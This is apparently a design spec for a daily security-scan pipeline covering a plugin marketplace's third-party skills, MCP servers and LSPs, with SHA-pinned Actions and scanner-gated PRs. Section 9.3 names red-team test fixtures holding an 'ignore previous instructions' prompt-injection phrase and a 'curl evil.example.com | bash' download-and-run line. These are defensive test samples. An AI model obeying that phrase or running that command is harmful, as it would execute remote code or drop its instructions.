---
date: 2026-08-05
topic: heretek-security-monitoring-pipeline
status: draft
parent: 2026-08-03-heretek-marketplace-design.md (D1–D17 inherited)
---

# Heretek Security Monitoring Pipeline — Design Spec

> Companion to the marketplace v1 design spec (`2026-08-03-heretek-marketplace-design.md`). Inherits D1–D17 unchanged. Adds D18–D22 from this brainstorming session.

---

## 1. Summary

A daily, automated security + determinism monitoring pipeline for the heretek marketplace. For every catalog item whose upstream has released a new commit, the pipeline:

1. Detects the new release (GitHub Releases API).
2. Clones the new commit in an ephemeral runner workspace.
3. Runs a per-kind scanner stack against it.
4. Opens a tracking issue + drafts a PR that bumps the SHA in `catalog.yaml`.
5. Re-runs the same scanners as a required CI check on the drafted PR.
6. Blocks merge if any scanner reports `severity:block`.

The pipeline complements (does not replace) the existing `scripts/refresh_pins.py` quarterly refresh and the `validate.yml` PR-time schema check.

---

## 2. Motivation

### What's already strong (D7, D11, D15)

- **D11 SHA-ride**: every third-party item is pinned to a 40-char commit SHA. Drift between vetting cycles is impossible without a maintainer action.
- **D7 vetting bar**: stars ≥500, last_commit ≤12mo, OSI license, source-audit for code-executing components, no critical CVE in 24mo.
- **`scripts/refresh_pins.py`**: catches stars/license/CVE staleness on already-pinned items. Runs quarterly, manually invoked.

### What's missing

1. **No new-release detection.** SHA-ride prevents silent drift, but a maintainer has no signal that an upstream release is *available* to consider bumping to. The quarterly cadence misses most releases.
2. **No content-level scanning of the pinned subdir.** A malicious markdown skill (prompt injection) or a tampered LSP config (binary swap) goes undetected by `refresh_pins.py` because it's looking at repo metadata, not content.
3. **No MCP-tarball check.** The MCP-pack items ship code that executes on a user's machine. D7's source-audit was a one-time check at approval; no continuous verification.
4. **Third-party GitHub Actions used in our own workflows are pinned to tags, not SHAs.** As of 2026, this is the *exact* vector TeamPCP exploited via the Trivy Action compromise. Current `validate.yml` uses `actions/checkout@v4`, `actions/setup-python@v5` — both tag refs.

### What 2026 threat data demands

- 454K malicious npm packages surfaced in 2025; 1.2M in 2026.
- Shai-Hulud worm (Sept 2025) + Mastra AI compromise (2026, North Korea, 140+ packages in 19 minutes) + TanStack (May 2026, GitHub Actions breach) + TeamPCP 5-day campaign (Trivy → Checkmarx → 66+ npm packages).
- The arxiv benchmark (2603.27549) evaluated 8 detection tools × 13 evasion variants: **no single tool is sufficient**. Defense in depth (≥2 vendors) is mandatory.
- The scanners themselves are now a major attack surface. Pin every `uses:` to a commit SHA.

---

## 3. Locked decisions

| # | Decision | Choice |
|---|---|---|
| D11 (parent) | Versioning (own) | SHA-ride — inherited |
| D7 (parent) | Vetting bar | Inherited |
| **D18** | **Pipeline scope** | **Third-party MCP servers, LSPs, and skills. First-party items (any item whose `sha` starts with `first-party-`) are excluded — they're already covered by PR review + `validate.yml`. This excludes the `agents` and `output-styles` plugins entirely.** |
| **D19** | **Cadence** | **Daily cron at 03:17 UTC. PR-time re-check on every drafted PR. The existing `refresh_pins.py` quarterly cadence stays unchanged for already-pinned items.** |
| **D20** | **Action SHA-pinning invariant** | **Every `uses:` reference in every `.github/workflows/*.yml` must be pinned to a full 40-character commit SHA, never a tag (`@vN`), branch (`@main`), or `@v0` rolling alias. Dependabot keeps them current. Enforced by `tests/test_action_pinning.py`.** |
| **D21** | **Action on new release** | **Open a single tracking issue (label `security-scan`) AND draft a PR (branch `security-scan/<item>-<date>`) that bumps `sha` + `vetting.date` in `catalog.yaml`. Maintainer gates the merge. The same scanners run as required CI checks on the PR.** |
| **D22** | **Scanner trust posture** | **Per-kind scanner composition. ≥2 vendors per kind where third-party scanners meaningfully apply (skills, MCPs). LSPs use the heretek-owned config linter as the only automated check, with CODEOWNERS review as the second line of defense. Scanner findings with `severity:block` are merge blockers; `severity:warn` and `severity:info` are advisory. A scanner-vendor outage degrades the run, never silently skips. False positives suppressible via `<!-- suppress: <scanner>:<rule_id> -->` comments in `catalog/reviews/<item>.md`, change-gated by the `security` plugin CODEOWNERS.** |

---

## 4. Architecture

```
                ┌─────────────────────────────────────────────┐
                │  .github/workflows/security-scan.yml        │
                │  (daily cron at 03:17 UTC, workflow_dispatch)│
                └─────────────────────────────────────────────┘
                              │
                              ▼
        ┌────────────────────────────────────────────────────┐
        │  scripts/security_scan.py   (Python entrypoint)    │
        │  - iterates catalog.yaml items                    │
        │  - fetches latest upstream SHA via GH Releases API│
        │  - dispatches to per-kind scanners                │
        │  - emits ScannerReport per item                   │
        └─────────────────────────────────────────────────────┘
                              │
                ┌─────────────┼─────────────┐
                ▼             ▼             ▼
         SkillSpector    Socket.dev    VirusTotal (soft)
         (skills/MCP)    (all kinds)   (MCP tarball by hash)
                              │
                              ▼
        ┌─────────────────────────────────────────────────────�
        │  scripts/issue_drafter.py                           │
        │  - opens tracking issue (label: security-scan)      │
        │  - creates draft PR (label: security-scan)         │
        │    bumps sha + vetting.date via ruamel.yaml        │
        └─────────────────────────────────────────────────────┘
                              │
                              ▼
        ┌─────────────────────────────────────────────────────┐
        │  .github/workflows/security-scan-pr.yml             │
        │  Required check on drafted PRs: re-runs scanners    │
        │  severity:block → required check fails → PR blocked│
        └─────────────────────────────────────────────────────┘
```

### 4.1 What is NOT changed

- `scripts/validate.py` (existing)
- `scripts/generate_marketplace.py` (existing)
- `scripts/refresh_pins.py` (existing — quarterly cadence preserved)
- `catalog.yaml` schema
- `marketplace.json` generation contract
- D11 SHA-ride, D7 vetting bar

---

## 5. Components

### 5.1 `scripts/security_scan.py` — entrypoint

**What it does:** Walks `catalog.yaml`, finds items whose upstream has a newer commit than the pinned `sha`, runs the per-kind scanner for each, emits one `ScannerReport` per changed item.

**How to use it:**
- Called by `security-scan.yml` (daily cron, no manual invocation expected in normal operation).
- Local invocation for debugging: `python scripts/security_scan.py --item context7 --dry-run`.

**Depends on:** PyYAML (existing), `requests` (existing), per-kind scanner wrappers in `scripts/scanners/`.

### 5.2 `scripts/scanners/` — per-kind wrappers

Three thin wrappers, each with the same interface:

```python
def scan(path: Path, *, token: Optional[str]) -> ScannerReport: ...
```

- `skills.py` → invokes NVIDIA SkillSpector CLI via `npx @nvidia/skillspector` (Node 20 in the runner). Parses JSON output.
- `mcp.py` → runs SkillSpector on the content **plus** calls VirusTotal v3 `/files/{sha256_hash}` for the upstream tarball. Soft-fails (records "no record" but doesn't fail the PR) if VT has no entry.
- `lsp.py` → runs the heretek-owned config linter (no third-party binary). Checks the LSP JSON's `rootUri`, command path, and any URL against the upstream repo's expected commit.

**Scanner output schema (uniform):**

```python
class ScannerReport:
    item_id: str
    scanner: str            # "skillspector" | "socket" | "virustotal" | "config-lint"
    severity: Literal["clean", "info", "warn", "block"]
    findings: list[Finding]  # each has path, line, message, rule_id (optional), cve_id (optional)
    raw: dict               # full scanner output for the issue body
```

### 5.3 `scripts/catalog_updater.py` — SHA + vetting.date writer

**What it does:** Updates one item's `sha` + `vetting.date` (and `vetting.cve_scan` if changed) in `catalog.yaml`, preserving comments and key order. Atomic write (write to `.tmp` then rename).

**Depends on:** `ruamel.yaml` (new runtime dep — required for comment preservation; PyYAML loses them, which would corrupt the hand-curated catalog).

### 5.4 `scripts/issue_drafter.py` — Issue + PR creator

**What it does:** For each `ScannerReport` with a new SHA, creates:
- One tracking issue titled `New upstream release: <plugin>/<item>` (label `security-scan`), body = scanner report.
- One draft PR (label `security-scan`, branch `security-scan/<item>-<date>`) that updates `catalog.yaml` and references the issue.

**Depends on:** GitHub REST API via `requests` + `GH_TOKEN` env (provided automatically in Actions).

### 5.5 `.github/workflows/security-scan.yml` — daily cron

```yaml
on:
  schedule:
    - cron: '17 3 * * *'      # 03:17 UTC daily
  workflow_dispatch:           # manual trigger for debugging
permissions:
  contents: write              # for the draft PR
  issues: write                # for the tracking issue
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<COMMIT_SHA>           # SHA-pinned per D20
      - uses: actions/setup-python@<COMMIT_SHA>        # SHA-pinned per D20
      - uses: actions/setup-node@<COMMIT_SHA>          # SHA-pinned per D20
      - run: pip install -r requirements-dev.txt
      - run: pip install ruamel.yaml
      - run: npx --yes @nvidia/skillspector --version  # cache warm
      - run: python scripts/security_scan.py --output reports/
      - run: python scripts/issue_drafter.py --reports reports/
      - uses: actions/upload-artifact@<COMMIT_SHA>     # SHA-pinned per D20
        with: { name: scan-reports, path: reports/ }
```

### 5.6 `.github/workflows/security-scan-pr.yml` — required check on drafted PRs

Runs `python scripts/security_scan.py --item <id> --pr-mode` against the **changed** item only. Reuses the same scanners. Any `severity:block` finding ⇒ required check fails ⇒ PR merge button disabled.

### 5.7 Action-pinning migration (one-time, prerequisite to D20)

Convert every `uses: foo/bar@vN` → `uses: foo/bar@<full-40-char-sha>` in:
- `.github/workflows/validate.yml` (3 references)
- `.github/workflows/smoke-test.yml` (~3 references)
- `.github/workflows/security-scan.yml` (new, ~6 references)
- `.github/workflows/security-scan-pr.yml` (new, ~4 references)

Add `.github/dependabot.yml` config (`package-ecosystem: github-actions`) to keep them current.

---

## 6. Scanner composition (per kind)

| Item kind | Primary scanner | Secondary scanner | Soft check | Baseline IOC |
|---|---|---|---|---|
| **Skills** | NVIDIA SkillSpector (`@nvidia/skillspector`, Apache) | Socket.dev | n/a | `shai-hulud-detect` (community) |
| **MCP servers** | SkillSpector (content) | Socket.dev (behavioral) | VirusTotal v3 by SHA-256 hash | `shai-hulud-detect` |
| **LSPs** | heretek-owned config linter (no third-party binary) | n/a | n/a | n/a |

**Hard rule:** ≥2 vendors per kind (defense in depth). SkillSpector + Socket for skills/MCPs; the heretek-owned linter + Socket for LSPs.

### 6.1 Action-pinning rule (D20)

Every Action reference in our workflows must be pinned to a 40-char commit SHA. The `uses:` syntax accepts:
- ✅ `uses: actions/checkout@b4b15d8...`  (40-char SHA — required)
- ❌ `uses: actions/checkout@v4`           (tag — forbidden)
- ❌ `uses: actions/checkout@main`         (branch — forbidden)
- ❌ `uses: actions/checkout@v0`           (rolling alias — forbidden)

Enforced by `tests/test_action_pinning.py`.

---

## 7. Data flow

### 7.1 Happy path — new upstream release detected

```
[03:17 UTC daily]
   └─▶ security-scan.yml starts
         │
         ├─▶ checkout @ pinned SHA
         │
         ├─▶ pip install + npx cache warm (SkillSpector)
         │
         ├─▶ python scripts/security_scan.py
         │       │
         │       ├─▶ load catalog.yaml
         │       │
         │       ├─▶ for each item:
         │       │     ├─▶ GET /repos/{owner}/{repo}/releases/latest
         │       │     │     └─▶ if pinned_sha == release.target_commitish  → skip
         │       │     ├─▶ if different → shallow git clone @new_sha into /tmp/scan/<id>/
         │       │     ├─▶ dispatch to scanners/<kind>.py
         │       │     │     ├─▶ skillspector scan /tmp/scan/<id>
         │       │     │     ├─▶ (MCP only) sha256(tarball) → VT /files/{hash}
         │       │     │     └─▶ (LSP only) config linter
         │       │     └─▶ emit ScannerReport (severity, findings, raw)
         │       │
         │       └─▶ write reports/<item_id>.json
         │
         └─▶ python scripts/issue_drafter.py
                 │
                 ├─▶ for each report with new_sha != pinned_sha:
                 │     ├─▶ POST /repos/.../issues     (tracking issue)
                 │     └─▶ POST /repos/.../git/refs   (branch security-scan/<id>-<date>)
                 │           └─▶ PUT /repos/.../contents/catalog.yaml
                 │                 (atomic sha + vetting.date update via ruamel.yaml)
                 │           └─▶ POST /repos/.../pulls   (draft PR, body refs issue)
                 │
                 └─▶ upload-artifact reports/

[PR opened → security-scan-pr.yml triggers]
   └─▶ python scripts/security_scan.py --item <id> --pr-mode
         └─▶ any severity:block finding → required check fails
               → PR merge button disabled
               → maintainer must resolve or close
```

### 7.2 State machine for an item

| State | Trigger | Action |
|---|---|---|
| **fresh** | pinned_sha == latest upstream | nothing |
| **pending-review** | new upstream SHA, scanners clean | issue open + PR drafted, awaiting maintainer merge |
| **blocked** | new upstream SHA, scanner flagged | issue open, PR blocked, must resolve or close |
| **quarantined** | already-pinned item, post-hoc CVE found | issue open `severity:block`, no PR (nothing to bump to) — maintainer decides: wait for upstream fix, or move to `rejected.md` |

---

## 8. Error handling

### 8.1 Error categories

| Category | Examples | Default response |
|---|---|---|
| **Transient** | network blip, 5xx, 429, scanner timeout | Retry with exponential backoff (base 2s, max 3 attempts, jitter ±20%). If still failing, treat as **Permanent**. |
| **Permanent** | upstream 404, repo deleted, scanner binary 410 Gone | `severity:block` for that item. Open tracking issue (no PR). Re-runs confirm. |
| **Degraded** | one scanner unavailable, others healthy | Run with available scanners. Severity escalates to next-worst finding across surviving scanners. PR comment notes which scanner was skipped and why. |
| **Fatal** | `catalog.yaml` unparseable, GitHub auth missing, disk full | Abort entire run. Open emergency issue: `security-scan aborted: <reason>`. No partial PRs. |

### 8.2 Rate-limit budget

- **GitHub REST API**: 5,000 req/hr/token. Current usage ~50 req/run (24 items × ~1 GH call + 1 PR call). Comfortable headroom.
- **`security_scan.py`** parses `X-RateLimit-Remaining`; pauses until `X-RateLimit-Reset` if it drops below 500 mid-run.
- **VirusTotal free tier**: 4 req/min, 500 req/day. Soft-fail on `no record`. **Hard cap 100 VT calls/day** in `security_scan.py`; beyond cap, MCP tarball scanning skipped + tracking issue opened.

### 8.3 Idempotency

A daily cron that retries or runs twice must not create duplicates:

- **Issue dedup:** before opening, search `is:open label:security-scan "New upstream release: <plugin>/<item>"`. If found, update it.
- **Branch dedup:** before creating `security-scan/<id>-<date>`, `git ls-remote` for that ref. If exists, `git push --force-with-lease` to it.
- **PR dedup:** if an open PR from this branch exists for the item, push new commits to it.

### 8.4 State-recovery

`security_scan.py` writes `.state/security-scan-<YYYY-MM-DD>.json` checkpoint after each item. On restart (`workflow_dispatch` re-run), skips items with status `done`. Items with status `started` are re-scanned.

### 8.5 Maintainer alerting

- **Workflow failure** (any unhandled exception) → `if: failure()` step opens emergency issue with full traceback.
- **Any severity:block finding** → tracking issue auto-labeled `severity:block`, `security` plugin owner auto-assigned via CODEOWNERS.
- **Weekly digest** → separate Monday-cron workflow opens one issue summarizing the week's findings.

### 8.6 Scanner vendor outage

- SkillSpector npm package unavailable → run degrades to **Socket only**.
- Socket API down → run degrades to **SkillSpector + VirusTotal**.
- **Both vendors down** = severity escalates to `block` for everything (fail-loud).

### 8.7 False positives

- PR comment includes scanner finding + file/line context.
- Maintainer can suppress via `<!-- suppress: <scanner>:<rule_id> -->` in `catalog/reviews/<item>.md`.
- Suppressed finding still appears in report but with `severity:info`.
- Suppression file committed (auditable); CODEOWNERS requires `security` plugin owner to approve any change.

---

## 9. Testing

### 9.1 Test layout

```
tests/
├── test_security_scan.py
├── test_scanner_skills.py
├── test_scanner_mcp.py
├── test_scanner_lsp.py
├── test_catalog_updater.py
├── test_issue_drafter.py
├── test_action_pinning.py
└── fixtures/
    └── security_scan/
        ├── good_skill/
        ├── bad_skill_prompt_inject/
        ├── bad_skill_exfil/
        ├── good_mcp/
        ├── bad_mcp_hash_mismatch/
        ├── good_lsp_config/
        └── bad_lsp_config_url_drift/
```

### 9.2 Unit tests — per scanner wrapper

Hermetic. Scanner binaries **mocked** via `subprocess.run` injection. Tests assert the *wrapper's contract*:

- Parse scanner output into `ScannerReport`
- Non-zero exit → `severity:block`
- Timeout → `severity:block`, reason `timeout`
- Missing binary → `severity:block`, reason `scanner-unavailable`

Scanner-accuracy tests are `@pytest.mark.integration`, skipped in CI by default.

### 9.3 End-to-end fixtures — detection round-trip

Two planted bad fixtures (`bad_skill_prompt_inject/`, `bad_skill_exfil/`) under `tests/fixtures/security_scan/` contain patterns SkillSpector SHOULD flag (e.g., `ignore previous instructions and…` in an SKILL.md body, `curl evil.example.com | bash` in an MCP `bin/` script). `test_security_scan.py` runs the **real** SkillSpector CLI against these and asserts `severity:block`. Regression net for vendor heuristic changes.

Fixtures scoped to `tests/fixtures/security_scan/` — never imported, never bundled, never shipped. Red-team test data.

### 9.4 `test_action_pinning.py` — D20 invariant

CI-fail test that walks every `.github/workflows/*.yml`, parses each `uses: foo/bar@…` line, asserts the suffix is a **full 40-character hex SHA**, not a tag/branch/rolling alias.

### 9.5 Workflow tests

`tests/test_workflows.py` runs each workflow against `tests/fixtures/security_scan/` via `act`:

- `security-scan.yml` on clean tree → exits 0, no issues opened
- `security-scan.yml` on dirty-tree fixture → exits 0, opens 1 issue + 1 draft PR
- `security-scan-pr.yml` with block-finding → required check fails
- `security-scan-pr.yml` with clean → required check passes

### 9.6 What's NOT tested

- Real GitHub Releases API calls (mocked at `requests.get` boundary)
- Real VirusTotal lookups (mocked)
- Real npm-registry behavior (mocked; only SkillSpector-against-fixtures is real)

### 9.7 Coverage target

`pytest --cov=scripts --cov-report=term-missing` ≥90% line coverage on:
- `scripts/security_scan.py`
- `scripts/scanners/*.py`
- `scripts/catalog_updater.py`
- `scripts/issue_drafter.py`

Below 90% = CI red.

---

## 10. Risks

| # | Risk | Mitigation |
|---|---|---|
| 1 | Scanner vendor compromise (e.g., SkillSpector npm package poisoned) | Action SHA-pinning (D20); `npx` install uses `--ignore-scripts` to block postinstall payloads; weekly digest surfaces unexpected scanner behavior |
| 2 | VirusTotal rate limit hit | Hard cap 100 calls/day (D22 soft budget); soft-fail on `no record`; degraded-mode still produces a PR |
| 3 | Maintainer never reviews drafted PRs → SHA-pins rot | Weekly digest surfaces stale PRs; CODEOWNERS auto-assigns; CI fails after 30-day staleness |
| 4 | Scanner false positive blocks a legitimate bump | Suppression mechanism (§8.7) with CODEOWNERS gate; maintainer can override via PR comment + second reviewer |
| 5 | Catalog comment corruption from ruamel.yaml upgrade | Pin ruamel.yaml version in `requirements.txt`; test fixtures include round-trip check in `test_catalog_updater.py` |
| 6 | Upstream release with a deliberately-backdoored commit lands just before our scan | SHA-pinning means we never pick it up unless maintainer approves; ADRs in `catalog/reviews/<item>.md` document the manual review |
| 7 | New item kind added to catalog that the scanner doesn't cover | CI fails the schema validation if `kind` is not in the scanner dispatch table; explicit `unsupported` error |
| 8 | GitHub Actions compromise of *our* workflow files (someone modifies the YAML to inject secrets exfil) | D20 SHA-pinning protects third-party Actions; CODEOWNERS requires two maintainer reviews on `.github/workflows/*.yml`; Dependabot keeps third-party pins current |

---

## 11. Phases

| Phase | Deliverable | Exit criteria |
|---|---|---|
| **P0 — Action pinning** | Convert every `uses:` to commit SHA across all workflow files; add `tests/test_action_pinning.py`; add `.github/dependabot.yml` | All workflows pass `test_action_pinning.py`; Dependabot PR visible in repo |
| **P1 — Pipeline skeleton** | `scripts/security_scan.py` + `scripts/scanners/{skills,mcp,lsp}.py` + `scripts/catalog_updater.py` + `scripts/issue_drafter.py`; `security-scan.yml` cron; no PR gate yet | Daily cron runs cleanly on current catalog (likely 0 reports since all items fresh); issue drafter tested with fixture |
| **P2 — Required check** | `security-scan-pr.yml`; scanners wired as required CI checks on the drafted PRs | Drafted PR with clean scanner report merges; PR with planted bad-fixture finding is blocked |
| **P3 — Weekly digest + CODEOWNERS** | Monday-cron digest workflow; `.github/CODEOWNERS` for `catalog/reviews/` and `.github/workflows/` | Digest issue appears Mondays; suppressions require security-owner review |
| **P4 — Backfill + rollout** | One-time re-scan of all currently-pinned items at current HEADs; public changelog entry; SECURITY.md update | All 24 current items have a fresh scanner report in `reports/`; users notified via SECURITY.md |

---

## 12. v2 backlog (out of scope for v1)

- Sigstore / SLSA attestation verification on every new SHA (requires upstream cooperation; ecosystem not ready)
- Cross-repo coordination if heretek ever forks items
- Auto-merge on `clean` severity (currently merge is always human-gated)
- Browser-based scanner dashboard
- Custom rules beyond vendor defaults (e.g., heretek-specific prompt-injection patterns)

---

## 13. References

- `2026-08-03-heretek-marketplace-design.md` — parent spec (D1–D17)
- `docs/superpowers/specs/2026-08-05-heretek-maintenance-skills-design.md` — companion maintenance-skills spec
- `scripts/refresh_pins.py` — existing quarterly refresh (preserved unchanged)
- `scripts/validate.py` — existing schema validator (preserved unchanged)
- `scripts/generate_marketplace.py` — existing generator (preserved unchanged)
- `tests/test_action_pinning.py` — D20 enforcement
- External scanners:
  - NVIDIA SkillSpector (Apache, npm: `@nvidia/skillspector`)
  - Socket.dev (free for OSS, GitHub Action available)
  - VirusTotal v3 API (`/files/{sha256_hash}`)
  - `shai-hulud-detect` (community IOC scanner)
- External context:
  - arxiv benchmark on npm malware detection (2603.27549)
  - GitHub Security: supply-chain attack disruptions (Sept 2025, May 2026)
  - Cisco AI Defense skill-scanner (alternative if NVIDIA license is an issue)
